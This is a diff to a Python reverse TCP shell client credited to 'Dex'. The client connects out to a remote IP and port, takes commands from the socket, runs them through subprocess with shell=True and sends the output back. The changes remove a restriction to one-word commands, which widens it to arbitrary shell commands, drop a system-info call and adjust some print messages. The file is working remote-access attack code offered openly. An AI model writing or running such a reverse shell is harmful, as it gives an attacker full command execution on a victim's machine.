@@ -1,8 +1,5 @@
 import socket,subprocess,getopt,sys,os
 
-
-
-
 def usage():
 
 	print("\nReverse TCP (Client) by Dex")
@@ -33,7 +30,6 @@ def connect(ip,port):
 			print("[!] Unable to connect! Is server listening?")
 			sys.exit(1)
 
-		sysinfo(s)
 		commandhandler(s)
 
 
@@ -47,16 +43,12 @@ def sysinfo(s):
 
 
 def exec(s):
-
 	com = s.recv(1024)
 	com = com.decode('utf-8')
-	if (' ' in com) == True:
-		err = '[!] One word commands supported only. (as of now...)'
-		err = err.encode('utf-8')
-		s.send(err)
 
 	p = subprocess.Popen(com, shell=True, stdout=subprocess.PIPE, stderr = subprocess.STDOUT)
 	out = p.communicate()[0]
+	print(out)
 	s.send(out)
 
 def commandhandler(s):
@@ -69,7 +61,7 @@ def commandhandler(s):
 		if command == 'exec':
 			exec(s)
 		if command == 'exit':
-			print("[!]Exit Signal Received.")
+			print("\n[!] Exit Signal Received.\n")
 			break
 			s.close()
 
